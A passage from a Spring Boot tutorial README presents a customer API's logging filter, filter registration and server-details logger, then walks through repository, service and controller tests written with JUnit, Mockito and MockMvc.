        return !request.getServletPath().matches(""(?i).*\\b(actuator|swagger|api-docs|favicon|ui)\\b.*"");
    }

    private String getClientIP(HttpServletRequest request) {

        String clientIP = request.getHeader(""Client-IP"");

        if (clientIP == null || clientIP.isEmpty() || ""unknown"".equalsIgnoreCase(clientIP)) {
            clientIP = request.getHeader(""X-Forwarded-For"");
        }

        if (clientIP == null || clientIP.isEmpty() || ""unknown"".equalsIgnoreCase(clientIP)) {
            clientIP = request.getHeader(""X-Real-IP"");
        }

        if (clientIP == null || clientIP.isEmpty() || ""unknown"".equalsIgnoreCase(clientIP)) {
            clientIP = request.getRemoteAddr();
        }

        return clientIP != null ? clientIP : ""Unknown"";
    }

}
```

</details>

### FiltersConfig

This configuration class registers the `LoggingFilter` as a Spring bean and sets its priority in the filter chain.

**Key Features**:

- Registers the `LoggingFilter` with a specified order of execution.
- Ensures that the filter applies to all incoming requests.

<details>
  <summary>View FiltersConfig code</summary>

```java
package com.ainigma100.customerapi.filter;

import lombok.AllArgsConstructor;
import org.springframework.boot.web.servlet.FilterRegistrationBean;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;

@AllArgsConstructor
@Configuration
public class FiltersConfig {

    private final LoggingFilter loggingFilter;

    @Bean
    public FilterRegistrationBean<LoggingFilter> loggingFilterBean() {

        final FilterRegistrationBean<LoggingFilter> filterBean = new FilterRegistrationBean<>();
        filterBean.setFilter(loggingFilter);
        filterBean.addUrlPatterns(""/*"");
        // Lower values have higher priority
        filterBean.setOrder(Integer.MAX_VALUE - 2);

        return filterBean;
    }

}

```

</details>

### ServerDetails

This component logs important server details when the application starts, including the server's protocol, host, port,
context path, and active profiles. It also provides the URL for accessing the Swagger UI.

**Key Features**:

- Logs server details and Swagger UI access URL on application startup.
- Supports both HTTP and HTTPS protocols.
- Displays the active Spring profiles.

<details>
  <summary>View ServerDetails code</summary>

```java
package com.ainigma100.customerapi.filter;

import lombok.AllArgsConstructor;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.boot.context.event.ApplicationReadyEvent;
import org.springframework.context.event.EventListener;
import org.springframework.core.env.Environment;
import org.springframework.stereotype.Component;

import java.net.InetAddress;
import java.net.UnknownHostException;
import java.util.Optional;

@AllArgsConstructor
@Component
public class ServerDetails {

    private static final Logger log = LoggerFactory.getLogger(ServerDetails.class);


    private final Environment environment;
    private static final String SERVER_SSL_KEY_STORE = ""server.ssl.key-store"";
    private static final String SERVER_PORT = ""server.port"";
    private static final String SERVER_SERVLET_CONTEXT_PATH = ""server.servlet.context-path"";
    private static final String SPRINGDOC_SWAGGER_UI_PATH = ""springdoc.swagger-ui.path"";
    private static final String DEFAULT_PROFILE = ""default"";

    @EventListener(ApplicationReadyEvent.class)
    public void logServerDetails() {

        String protocol = Optional.ofNullable(environment.getProperty(SERVER_SSL_KEY_STORE)).map(key -> ""https"").orElse(""http"");
        String host = getServerIP();
        String serverPort = Optional.ofNullable(environment.getProperty(SERVER_PORT)).orElse(""8080"");
        String contextPath = Optional.ofNullable(environment.getProperty(SERVER_SERVLET_CONTEXT_PATH)).orElse("""");
        String[] activeProfiles = Optional.of(environment.getActiveProfiles()).orElse(new String[0]);
        String activeProfile = (activeProfiles.length > 0) ? String.join("","", activeProfiles) : DEFAULT_PROFILE;
        String swaggerUI = Optional.ofNullable(environment.getProperty(SPRINGDOC_SWAGGER_UI_PATH)).orElse(""/swagger-ui/index.html"");

        log.info(
                """"""
                        
                        
                        Access Swagger UI URL: {}://{}:{}{}{}
                        Active Profile: {}
                        """""",
                protocol, host, serverPort, contextPath, swaggerUI,
                activeProfile
        );
    }

    private String getServerIP() {
        try {
            return InetAddress.getLocalHost().getHostAddress();
        } catch (UnknownHostException e) {
            log.error(""Error resolving host address"", e);
            return ""unknown"";
        }
    }
}
```

</details>

---

## 11. Testing

Testing is essential to ensure your application works as expected. This section will cover how to effectively test your
Spring Boot application using both unit testing and integration testing strategies, including Behavior Driven
Development (BDD).

### Unit Testing

Unit testing is a method of testing individual units or components of the software in isolation. The main goal is to
validate that each unit of the software performs as expected. A ""unit"" is typically the smallest piece of code that can
be logically isolated, such as a function, method, or class.

### Behavior Driven Development (BDD) Testing

BDD focuses on writing tests that describe the system's behavior from the user's perspective. It helps improve
collaboration between developers, testers, and stakeholders. In Java, you can use JUnit with Mockito to implement BDD.

#### IntelliJ Live Template for BDD

To make writing BDD tests easier in IntelliJ IDEA, you can create a live template that generates a basic structure for
BDD tests. Hereâ€™s the template you can use:

```xml

<template name=""bdd""
          value=""@org.junit.jupiter.api.Test&#10;void given$NAME$_when$NAME2$_then$NAME3$() {&#10;&#10;    // given - precondition or setup&#10;    org.mockito.BDDMockito.given().willReturn();&#10;    &#10;    // when - action or behaviour that we are going to test&#10;    &#10;    &#10;    // then - verify the output&#10;&#10;}""
          description=""Behaviour Driven Development (BDD) test template"" toReformat=""false"" toShortenFQNames=""true"">
    <variable name=""NAME"" expression="""" defaultValue="""" alwaysStopAt=""true""/>
    <variable name=""NAME2"" expression="""" defaultValue="""" alwaysStopAt=""true""/>
    <variable name=""NAME3"" expression="""" defaultValue="""" alwaysStopAt=""true""/>
    <context>
        <option name=""JAVA_DECLARATION"" value=""true""/>
    </context>
</template>
```

With the above template, when you type `bdd` in your test class, IntelliJ IDEA will generate a skeleton for a BDD-style
test, helping you follow the BDD principles consistently.

In your Spring Boot project, BDD can be implemented as follows:

1. **Given**: Set up the initial context or preconditions for the test.
2. **When**: Perform the action or behavior that you want to test.
3. **Then**: Verify the expected outcome or results.

By structuring your tests this way, you ensure they are clear, concise, and focused on the behavior of the application
from the userâ€™s perspective.

### Testing the Repository Layer

The repository layer is responsible for interacting with the database. When testing this layer, focus on ensuring that
your custom query methods behave as expected. If you are only using the provided methods from `JpaRepository` without
any custom queries, you do not need to test this layer.

- **`@DataJpaTest`**: Configures an in-memory database, automatically rolling back transactions after each test. Ensure
  that you have the H2 dependency in your project for this annotation to work correctly. This annotation also limits the
  loaded beans to those required for JPA tests.

- **`@Autowired`**: Used to inject the repository instance into your test class, allowing you to call repository methods
  directly.

- **`@BeforeEach`**: Indicates that the annotated method should be run before each test method in the class. This is
  commonly used for setting up test data or initializing common objects used in multiple tests.

- **`@Test`**: The most common annotation in JUnit, marking a method as a test method that will be executed when running
  the test suite.

<details>
  <summary>View CustomerRepositoryTest code</summary>

```java
package com.ainigma100.customerapi.repository;

import com.ainigma100.customerapi.entity.Customer;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.autoconfigure.orm.jpa.DataJpaTest;

import java.time.LocalDate;

import static org.junit.jupiter.api.Assertions.*;


/*
 * @DataJpaTest will automatically configure in-memory database for testing
 * and, it will not load annotated beans into the Application Context.
 * It will only load the repository class. Tests annotated with @DataJpaTest
 * are by default transactional and roll back at the end of each test.
 */
@DataJpaTest
class CustomerRepositoryTest {

    @Autowired
    private CustomerRepository customerRepository;

    private Customer customer;

    /**
     * This method will be executed before each and every test inside this class
     */
    @BeforeEach
    void setUp() {

        customer = new Customer();
        customer.setFirstName(""John"");
        customer.setLastName(""Wick"");
        customer.setEmail(""jwick@tester.com"");
        customer.setPhoneNumber(""0123456789"");
        customer.setDateOfBirth(LocalDate.now().minusYears(18));

    }

    @Test
    void givenValidEmail_whenFindByEmail_thenReturnCustomer() {

        // given - precondition or setup
        String email = ""jwick@tester.com"";
        customerRepository.save(customer);

        // when - action or behaviour that we are going to test
        Customer customerFromDB = customerRepository.findByEmail(email).orElse(null);

        // then - verify the output
        assertNotNull(customerFromDB);
        assertEquals(customer.getFirstName(), customerFromDB.getFirstName());
        assertEquals(customer.getLastName(), customerFromDB.getLastName());
        assertEquals(customer.getEmail(), customerFromDB.getEmail());
        assertEquals(customer.getPhoneNumber(), customerFromDB.getPhoneNumber());
        assertEquals(customer.getDateOfBirth(), customerFromDB.getDateOfBirth());
    }

    @Test
    void givenInvalidEmail_whenFindByEmail_thenReturnNothing() {

        // given - precondition or setup
        String email = ""abc@tester.com"";
        customerRepository.save(customer);

        // when - action or behaviour that we are going to test
        Customer customerFromDB = customerRepository.findByEmail(email).orElse(null);

        // then - verify the output
        assertNull(customerFromDB);
    }

    @Test
    void givenNullEmail_whenFindByEmail_thenReturnNothing() {

        // given - precondition or setup
        String email = null;
        customerRepository.save(customer);

        // when - action or behaviour that we are going to test
        Customer customerFromDB = customerRepository.findByEmail(email).orElse(null);

        // then - verify the output
        assertNull(customerFromDB);
    }

    @Test
    void givenEmptyEmail_whenFindByEmail_thenReturnNothing() {

        // given - precondition or setup
        String email = """";
        customerRepository.save(customer);

        // when - action or behaviour that we are going to test
        Customer customerFromDB = customerRepository.findByEmail(email).orElse(null);

        // then - verify the output
        assertNull(customerFromDB);
    }


}
```

</details>


<br><br>

### Testing the Service Layer

The service layer contains your business logic and interacts with the repository layer. Testing this layer typically
involves mocking the repository to isolate the service logic.

- **`@ExtendWith(MockitoExtension.class)`**: Enables Mockito annotations in your test class.
- **`@InjectMocks`**: Injects the mock objects into the service class, allowing you to test the service logic
  independently of the repository layer. This annotation creates an instance of the class under test and injects the
  mock dependencies annotated with `@Mock` into it.
- **`@Mock`**: Used to create mock instances of the repository or other dependencies.
- **`@DisplayName`**: Allows you to provide a custom name for your test methods, making them more descriptive and
  readable in test reports.

<details>
  <summary>View CustomerServiceImplTest code</summary>

```java
package com.ainigma100.customerapi.service.impl;

import com.ainigma100.customerapi.dto.CustomerDTO;
import com.ainigma100.customerapi.dto.CustomerEmailUpdateDTO;
import com.ainigma100.customerapi.entity.Customer;
import com.ainigma100.customerapi.exception.ResourceAlreadyExistException;
import com.ainigma100.customerapi.exception.ResourceNotFoundException;
import com.ainigma100.customerapi.mapper.CustomerMapper;
import com.ainigma100.customerapi.repository.CustomerRepository;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.extension.ExtendWith;
import org.mockito.InjectMocks;
import org.mockito.Mock;
import org.mockito.junit.jupiter.MockitoExtension;

import java.time.LocalDate;
import java.time.LocalDateTime;
import java.util.Optional;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;
import static org.mockito.BDDMockito.given;
import static org.mockito.Mockito.*;

/*
 * @ExtendWith(MockitoExtension.class) informs Mockito that we are using
 * mockito annotations to mock the dependencies
 */
@ExtendWith(MockitoExtension.class)
class CustomerServiceImplTest {

    // @InjectMocks creates the mock object of the class and injects the mocks
    // that are marked with the annotations @Mock into it.
    @InjectMocks
    private CustomerServiceImpl customerService;

    @Mock
    private CustomerRepository customerRepository;

    @Mock
    private CustomerMapper customerMapper;

    private Customer customer;
    private CustomerDTO customerDTO;

    /**
     * This method will be executed before each and every test inside this class
     */
    @BeforeEach
    void setUp() {

        customer = new Customer();
        customer.setId(1L);
        customer.setFirstName(""John"");
        customer.setLastName(""Wick"");
        customer.setEmail(""jwick@tester.com"");
        customer.setPhoneNumber(""0123456789"");
        customer.setDateOfBirth(LocalDate.now().minusYears(18));
        customer.setCreatedDate(LocalDateTime.now());
        customer.setUpdatedDate(LocalDateTime.now());

        customerDTO = new CustomerDTO();
        customerDTO.setId(1L);
        customerDTO.setFirstName(""John"");
        customerDTO.setLastName(""Wick"");
        customerDTO.setEmail(""jwick@tester.com"");
        customerDTO.setPhoneNumber(""0123456789"");
        customerDTO.setDateOfBirth(LocalDate.now().minusYears(18));
    }


    @Test
    @DisplayName(""Test creating a new customer"")
    void givenCustomerDTO_whenCreateCustomer_thenReturnCustomerDTO() {

        // given - precondition or setup
        String email = customerDTO.getEmail();
        given(customerRepository.findByEmail(email)).willReturn(Optional.empty());
        given(customerMapper.customerDTOToCustomer(customerDTO)).willReturn(customer);
        given(customerRepository.save(customer)).willReturn(customer);
        given(customerMapper.customerToCustomerDTO(customer)).willReturn(customerDTO);

        // when - action or behaviour that we are going to test
        CustomerDTO result = customerService.createCustomer(customerDTO);

        // then - verify the output
        assertThat(result).isNotNull();
        assertThat(result.getFirstName()).isEqualTo(customerDTO.getFirstName());
        assertThat(result.getLastName()).isEqualTo(customerDTO.getLastName());
        assertThat(result.getEmail()).isEqualTo(customerDTO.getEmail());
        assertThat(result.getPhoneNumber()).isEqualTo(customerDTO.getPhoneNumber());

        verify(customerRepository, times(1)).findByEmail(email);
        verify(customerMapper, times(1)).customerDTOToCustomer(customerDTO);
        verify(customerRepository, times(1)).save(customer);
        verify(customerMapper, times(1)).customerToCustomerDTO(customer);

    }

    @Test
    @DisplayName(""Test creating a customer with existing email throws ResourceAlreadyExistException"")
    void givenExistingEmail_whenCreateCustomer_thenThrowResourceAlreadyExistException() {

        // given - precondition or setup
        String email = customerDTO.getEmail();
        given(customerRepository.findByEmail(email)).willReturn(Optional.of(customer));

        // when/then - verify that the ResourceAlreadyExistException is thrown
        assertThatThrownBy(() -> customerService.createCustomer(customerDTO))
                .isInstanceOf(ResourceAlreadyExistException.class)
                .hasMessageContaining(""Resource Customer with email : '"" + email + ""' already exist"");


        verify(customerRepository, times(1)).findByEmail(customerDTO.getEmail());
        verify(customerMapper, never()).customerDTOToCustomer(any(CustomerDTO.class));
        verify(customerRepository, never()).save(any(Customer.class));
        verify(customerMapper, never()).customerToCustomerDTO(any(Customer.class));

    }

    @Test
    @DisplayName(""Test retrieving a customer by ID"")
    void givenValidId_whenGetCustomerById_thenReturnCustomerDTO() {

        // given - precondition or setup
        Long id = 1L;
        given(customerRepository.findById(id)).willReturn(Optional.of(customer));
        given(customerMapper.customerToCustomerDTO(customer)).willReturn(customerDTO);

        // when - action or behaviour that we are going to test
        CustomerDTO result = customerService.getCustomerById(id);

        // then - verify the output
        assertThat(result).isNotNull();
        assertThat(result.getId()).isEqualTo(customerDTO.getId());
        assertThat(result.getFirstName()).isEqualTo(customerDTO.getFirstName());
        assertThat(result.getLastName()).isEqualTo(customerDTO.getLastName());
        assertThat(result.getEmail()).isEqualTo(customerDTO.getEmail());
        assertThat(result.getPhoneNumber()).isEqualTo(customerDTO.getPhoneNumber());

        verify(customerRepository, times(1)).findById(id);
        verify(customerMapper, times(1)).customerToCustomerDTO(customer);

    }


    @Test
    @DisplayName(""Test retrieving a customer by invalid ID throws ResourceNotFoundException"")
    void givenInvalidId_whenGetCustomerById_thenThrowResourceNotFoundException() {

        // given - precondition or setup
        Long id = 100L;
        given(customerRepository.findById(id)).willReturn(Optional.empty());

        // when/then - verify that the ResourceNotFoundException is thrown
        assertThatThrownBy(() -> customerService.getCustomerById(id))
                .isInstanceOf(ResourceNotFoundException.class)
                .hasMessage(""Customer with id : '"" + id + ""' not found"");


        verify(customerRepository, times(1)).findById(id);
        verify(customerMapper, never()).customerToCustomerDTO(any(Customer.class));

    }


    @Test
    @DisplayName(""Test updating a customer by ID"")
    void givenValidIdAndCustomerDTO_whenUpdateCustomer_thenReturnUpdatedCustomerDTO() {

        // given - precondition or setup
        Long id = 1L;
        given(customerRepository.findById(id)).willReturn(Optional.of(customer));
        given(customerMapper.customerDTOToCustomer(customerDTO)).willReturn(customer);
        given(customerRepository.save(customer)).willReturn(customer);
        given(customerMapper.customerToCustomerDTO(customer)).willReturn(customerDTO);

        // when - action or behaviour that we are going to test
        CustomerDTO result = customerService.updateCustomer(id, customerDTO);

        // then - verify the output
        assertThat(result).isNotNull();
        assertThat(result.getFirstName()).isEqualTo(customerDTO.getFirstName());
        assertThat(result.getLastName()).isEqualTo(customerDTO.getLastName());
        assertThat(result.getEmail()).isEqualTo(customerDTO.getEmail());
        assertThat(result.getPhoneNumber()).isEqualTo(customerDTO.getPhoneNumber());

        verify(customerRepository, times(1)).findById(id);
        verify(customerMapper, times(1)).customerDTOToCustomer(customerDTO);
        verify(customerRepository, times(1)).save(customer);
        verify(customerMapper, times(1)).customerToCustomerDTO(customer);

    }

    @Test
    @DisplayName(""Test updating a customer by invalid ID throws ResourceNotFoundException"")
    void givenInvalidIdAndCustomerDTO_whenUpdateCustomer_thenThrowResourceNotFoundException() {

        // given - precondition or setup
        Long id = 100L;
        given(customerRepository.findById(id)).willReturn(Optional.empty());

        // when/then - verify that the ResourceNotFoundException is thrown
        assertThatThrownBy(() -> customerService.updateCustomer(id, customerDTO))
                .isInstanceOf(ResourceNotFoundException.class)
                .hasMessage(""Customer with id : '"" + id + ""' not found"");


        verify(customerRepository, times(1)).findById(id);
        verify(customerMapper, never()).customerDTOToCustomer(any(CustomerDTO.class));
        verify(customerRepository, never()).save(any(Customer.class));
        verify(customerMapper, never()).customerToCustomerDTO(any(Customer.class));

    }


    @Test
    @DisplayName(""Test updating a customer's email by ID"")
    void givenValidIdAndCustomerEmailUpdateDTO_whenUpdateCustomerEmail_thenReturnCustomerDTO() {

        // given - precondition or setup
        Long id = 1L;
        CustomerEmailUpdateDTO customerEmailUpdateDTO = new CustomerEmailUpdateDTO();
        customerEmailUpdateDTO.setEmail(""loco@gmail.com"");
        customer.setEmail(customerEmailUpdateDTO.getEmail());
        given(customerRepository.findById(id)).willReturn(Optional.of(customer));
        given(customerRepository.save(customer)).willReturn(customer);
        given(customerMapper.customerToCustomerDTO(customer)).willReturn(customerDTO);

        // when - action or behaviour that we are going to test
        CustomerDTO result = customerService.updateCustomerEmail(id, customerEmailUpdateDTO);

        // then - verify the output
        assertThat(result).isNotNull();
        assertThat(result.getFirstName()).isEqualTo(customerDTO.getFirstName());
        assertThat(result.getLastName()).isEqualTo(customerDTO.getLastName());
        assertThat(result.getEmail()).isEqualTo(customerDTO.getEmail());
        assertThat(result.getPhoneNumber()).isEqualTo(customerDTO.getPhoneNumber());

        verify(customerRepository, times(1)).findById(id);
        verify(customerRepository, times(1)).save(customer);
        verify(customerMapper, times(1)).customerToCustomerDTO(customer);

    }

    @Test
    @DisplayName(""Test updating a customer's email by invalid ID throws ResourceNotFoundException"")
    void givenInvalidIdAndCustomerEmailUpdateDTO_whenUpdateCustomerEmail_thenThrowResourceNotFoundException() {

        // given - precondition or setup
        Long id = 100L;
        CustomerEmailUpdateDTO customerEmailUpdateDTO = new CustomerEmailUpdateDTO();
        customerEmailUpdateDTO.setEmail(""loco@gmail.com"");
        customer.setEmail(customerEmailUpdateDTO.getEmail());

        given(customerRepository.findById(id)).willReturn(Optional.empty());

        // when/then - verify that the ResourceNotFoundException is thrown
        assertThatThrownBy(() -> customerService.updateCustomerEmail(id, customerEmailUpdateDTO))
                .isInstanceOf(ResourceNotFoundException.class)
                .hasMessage(""Customer with id : '"" + id + ""' not found"");


        verify(customerRepository, times(1)).findById(id);
        verify(customerRepository, never()).save(any(Customer.class));
        verify(customerMapper, never()).customerToCustomerDTO(any(Customer.class));

    }


    @Test
    @DisplayName(""Test deleting a customer by ID"")
    void givenValidId_whenDeleteCustomer_thenDeleteCustomer() {

        // given - precondition or setup
        Long id = 1L;
        given(customerRepository.findById(id)).willReturn(Optional.of(customer));
        doNothing().when(customerRepository).delete(customer);

        // when - action or behaviour that we are going to test
        customerService.deleteCustomer(id);

        // then - verify the output
        verify(customerRepository, times(1)).findById(id);
        verify(customerRepository, times(1)).delete(customer);

    }

    @Test
    @DisplayName(""Test deleting a customer by invalid ID throws ResourceNotFoundException"")
    void givenInvalidId_whenDeleteCustomer_thenThrowResourceNotFoundException() {

        // given - precondition or setup
        Long id = 1L;
        given(customerRepository.findById(id)).willReturn(Optional.empty());

        // when/then - verify that the ResourceNotFoundException is thrown
        assertThatThrownBy(() -> customerService.deleteCustomer(id))
                .isInstanceOf(ResourceNotFoundException.class)
                .hasMessage(""Customer with id : '"" + id + ""' not found"");

        verify(customerRepository, times(1)).findById(id);
        verify(customerRepository, never()).delete(any(Customer.class));

    }

}
```

</details>



<br><br>

### Testing the Controller Layer

The controller layer is responsible for handling HTTP requests and returning appropriate responses. When testing this
layer, the goal is to ensure that the controller behaves correctly in response to various inputs and interactions with
its dependencies, such as services and mappers.

- **`@WebMvcTest`**: This annotation is used to load only the components required for testing the controller layer. It
  configures Springâ€™s testing support for MVC applications but does not load the full application context, making tests
  faster and more focused.

- **`@MockBean`**: This annotation is used to create and inject mock instances of the service layer or other
  dependencies that the controller interacts with. Mocking these dependencies ensures that the test focuses solely on
  the behavior of the controller without involving actual business logic or database interactions.

- **`@Autowired`**: This annotation is used to inject the `MockMvc` and `ObjectMapper` beans into your test class.
    - `MockMvc` is used to simulate HTTP requests and test the controllerâ€™s response without starting the server.
    - `ObjectMapper` is used for serializing and deserializing JSON objects, making it easier to work with request and
      response bodies in tests.

### Key Points:

1. **Mocking Service and Mapper**:
   - Mock the service and mapper beans to isolate the controllerâ€™s logic. By controlling the outputs of the service and
     mapper methods, you can focus your tests on the controller's behavior and ensure that it processes requests and
     responses correctly.

2. **Testing HTTP Methods**:
   - Test different HTTP methods (e.g., GET, POST, PUT, DELETE) to ensure that the controller correctly processes
     requests and returns the expected responses for each type of action.

3. **Argument Matchers**:
   - When setting up mock interactions, use `ArgumentMatchers` like `any(Class.class)` to generalize the input
     parameters, especially when you do not care about the specific value. Alternatively, use specific matchers like
     `eq()` when you want to ensure that the method is called with exact values. Choosing the right matcher depends on
     your test scenario. Understanding when to use each will make your tests more reliable.

4. **Validation of Responses**:
   - Validate the status code, headers, and response body using methods like `andExpect()`. Ensure that the response
     structure and content are what you expect. This step is crucial to verify that your API meets its contract.

5. **Use of `ResultActions`**:
   - Capture the result of the `MockMvc` request using `ResultActions`. This allows you to chain further verifications
     on the response, ensuring that all aspects of the response are as expected.

### Note:

- When writing controller tests, itâ€™s important to decide whether to use `ArgumentMatchers` like `any()` for flexible
  input matching or `eq()` for strict matching based on the context of your test scenario. For more details on using
  argument matchers or `eq()` in Mockito, you can search online resources or refer to Mockito documentation.

<details>
  <summary>View CustomerControllerTest code</summary>

```java
package com.ainigma100.customerapi.controller;

import com.ainigma100.customerapi.dto.CustomerDTO;
import com.ainigma100.customerapi.dto.CustomerEmailUpdateDTO;
import com.ainigma100.customerapi.dto.CustomerRequestDTO;
import com.ainigma100.customerapi.enums.Status;
import com.ainigma100.customerapi.mapper.CustomerMapper;
import com.ainigma100.customerapi.service.CustomerService;
import com.fasterxml.jackson.databind.ObjectMapper;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.autoconfigure.web.servlet.WebMvcTest;
import org.springframework.boot.test.mock.mockito.MockBean;
import org.springframework.http.MediaType;
import org.springframework.test.web.servlet.MockMvc;
import org.springframework.test.web.servlet.ResultActions;

import java.time.LocalDate;

import static org.hamcrest.CoreMatchers.is;
import static org.mockito.ArgumentMatchers.any;
import static org.mockito.BDDMockito.given;
import static org.mockito.BDDMockito.willDoNothing;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.*;
import static org.springframework.test.web.servlet.result.MockMvcResultHandlers.print;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.jsonPath;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;


/*
 * @WebMvcTest annotation will load all the components required
 * to test the Controller layer. It will not load the service or repository layer components
 */
@WebMvcTest(CustomerController.class)
class CustomerControllerTest {

    @Autowired
    private ObjectMapper objectMapper;

    @Autowired
    private MockMvc mockMvc;

    @MockBean
    private CustomerService customerService;

    @MockBean
    private CustomerMapper customerMapper;

    private CustomerRequestDTO customerRequestDTO;
    private CustomerDTO customerDTO;

    @BeforeEach
    void setUp() {

        customerRequestDTO = new CustomerRequestDTO();
        customerRequestDTO.setFirstName(""John"");
        customerRequestDTO.setLastName(""Wick"");
        customerRequestDTO.setEmail(""jwick@tester.com"");
        customerRequestDTO.setPhoneNumber(""0123456789"");
        customerRequestDTO.setDateOfBirth(LocalDate.now().minusYears(18));


        customerDTO = new CustomerDTO();
        customerDTO.setId(1L);
        customerDTO.setFirstName(""John"");
        customerDTO.setLastName(""Wick"");
        customerDTO.setEmail(""jwick@tester.com"");
        customerDTO.setPhoneNumber(""0123456789"");
        customerDTO.setDateOfBirth(LocalDate.now().minusYears(18));

    }


    @Test
    void givenCustomerDTO_whenCreateCustomer_thenReturnCustomerDTO() throws Exception {

        // given - precondition or setup
        given(customerMapper.customerRequestDTOToCustomerDTO(any(CustomerRequestDTO.class)))
                .willReturn(customerDTO);

        given(customerService.createCustomer(any(CustomerDTO.class))).willReturn(customerDTO);

        // when - action or behaviour that we are going to test
        ResultActions response = mockMvc.perform(post(""/api/v1/customers"")
                .contentType(MediaType.APPLICATION_JSON)
                .content(objectMapper.writeValueAsString(customerRequestDTO)));

        // then - verify the output
        response.andDo(print())
                // verify the status code that is returned
                .andExpect(status().isCreated())
                // verify the actual returned value and the expected value
                // $ - root member of a JSON structure whether it is an object or array
                .andExpect(jsonPath(""$.status"", is(Status.SUCCESS.getValue())))
                .andExpect(jsonPath(""$.results.id"", is(1)))
                .andExpect(jsonPath(""$.results.firstName"", is(""John"")))
                .andExpect(jsonPath(""$.results.lastName"", is(""Wick"")))
                .andExpect(jsonPath(""$.results.email"", is(""jwick@tester.com"")))
                .andExpect(jsonPath(""$.results.phoneNumber"", is(""0123456789"")))
                .andExpect(jsonPath(""$.results.dateOfBirth"", is(LocalDate.now().minusYears(18).toString())));
    }


    @Test
    void givenCustomerDTO_whenGetCustomerById_thenReturnCustomerDTO() throws Exception {

        // given - precondition or setup
        given(customerService.getCustomerById(any(Long.class))).willReturn(customerDTO);

        // when - action or behaviour that we are going to test
        ResultActions response = mockMvc.perform(get(""/api/v1/customers/{id}"", 1L)
                .contentType(MediaType.APPLICATION_JSON));

        // then - verify the output
        response.andDo(print())
                // verify the status code that is returned
                .andExpect(status().isOk())
                // verify the actual returned value and the expected value
                // $ - root member of a JSON structure whether it is an object or array
                .andExpect(jsonPath(""$.status"", is(Status.SUCCESS.getValue())))
                .andExpect(jsonPath(""$.results.id"", is(1)))
                .andExpect(jsonPath(""$.results.firstName"", is(""John"")))
                .andExpect(jsonPath(""$.results.lastName"", is(""Wick"")))
                .andExpect(jsonPath(""$.results.email"", is(""jwick@tester.com"")))
                .andExpect(jsonPath(""$.results.phoneNumber"", is(""0123456789"")))
                .andExpect(jsonPath(""$.results.dateOfBirth"", is(LocalDate.now().minusYears(18).toString())));
    }


    @Test
    void givenCustomerDTO_whenUpdateCustomer_thenReturnCustomerDTO() throws Exception {

        // given - precondition or setup
        given(customerMapper.customerRequestDTOToCustomerDTO(any(CustomerRequestDTO.class)))
                .willReturn(customerDTO);

        given(customerService.updateCustomer(any(Long.class), any(CustomerDTO.class))).willReturn(customerDTO);

        // when - action or behaviour that we are going to test
        ResultActions response = mockMvc.perform(put(""/api/v1/customers/{id}"", 1L)
                .contentType(MediaType.APPLICATION_JSON)
                .content(objectMapper.writeValueAsString(customerRequestDTO)));

        // then - verify the output
        response.andDo(print())
                // verify the status code that is returned
                .andExpect(status().isOk())
                // verify the actual returned value and the expected value
                // $ - root member of a JSON structure whether it is an object or array
                .andExpect(jsonPath(""$.status"", is(Status.SUCCESS.getValue())))
                .andExpect(jsonPath(""$.results.id"", is(1)))
                .andExpect(jsonPath(""$.results.firstName"", is(""John"")))
                .andExpect(jsonPath(""$.results.lastName"", is(""Wick"")))
                .andExpect(jsonPath(""$.results.email"", is(""jwick@tester.com"")))
                .andExpect(jsonPath(""$.results.phoneNumber"", is(""0123456789"")))
                .andExpect(jsonPath(""$.results.dateOfBirth"", is(LocalDate.now().minusYears(18).toString())));
    }


    @Test
    void givenCustomerEmailUpdateDTO_whenUpdateCustomerEmail_thenReturnCustomerDTO() throws Exception {

        // given - precondition or setup
        CustomerEmailUpdateDTO customerEmailUpdateDTO = new CustomerEmailUpdateDTO();
        customerEmailUpdateDTO.setEmail(""loco@gmail.com"");
        customerDTO.setEmail(customerEmailUpdateDTO.getEmail());

        given(customerService.updateCustomerEmail(any(Long.class), any(CustomerEmailUpdateDTO.class)))
                .willReturn(customerDTO);

        // when - action or behaviour that we are going to test
        ResultActions response = mockMvc.perform(patch(""/api/v1/customers/{id}/email"", 1L)
                .contentType(MediaType.APPLICATION_JSON)
                .content(objectMapper.writeValueAsString(customerEmailUpdateDTO)));

        // then - verify the output
        response.andDo(print())
                // verify the status code that is returned
                .andExpect(status().isOk())
                // verify the actual returned value and the expected value
                // $ - root member of a JSON structure whether it is an object or array
                .andExpect(jsonPath(""$.status"", is(Status.SUCCESS.getValue())))
                .andExpect(jsonPath(""$.results.id"", is(1)))
                .andExpect(jsonPath(""$.results.firstName"", is(""John"")))
                .andExpect(jsonPath(""$.results.lastName"", is(""Wick"")))
                .andExpect(jsonPath(""$.results.email"", is(""loco@gmail.com"")))
                .andExpect(jsonPath(""$.results.phoneNumber"", is(""0123456789"")))
                .andExpect(jsonPath(""$.results.dateOfBirth"", is(LocalDate.now().minusYears(18).toString())));
    }


    @Test
    void givenCustomerDTO_whenDeleteCustomer_thenReturnCustomerDTO() throws Exception {

        // given - precondition or setup
        willDoNothing().given(customerService).deleteCustomer(any(Long.class));

        // when - action or behaviour that we are going to test
        ResultActions response = mockMvc.perform(delete(""/api/v1/customers/{id}"", 1L)
                .contentType(MediaType.APPLICATION_JSON));

        // then - verify the output
        response.andDo(print())
                // verify the status code that is returned
                .andExpect(status().isOk())
                // verify the actual returned value and the expected value
                // $ - root member of a JSON structure whether it is an object or array
                .andExpect(jsonPath(""$.status"", is(Status.SUCCESS.getValue())));
    }


}
```

</details>


<br><br>

### Integration Testing

Integration Testing is the phase in software testing where individual units or components of an application are combined
and tested as a group. The main goal of integration testing is to verify the interactions between different modules and
to ensure that they work together as expected. In a Spring Boot application, this typically involves testing the full
stack, including the controller, service, repository layers, and the actual database.

### Using Docker with Testcontainers

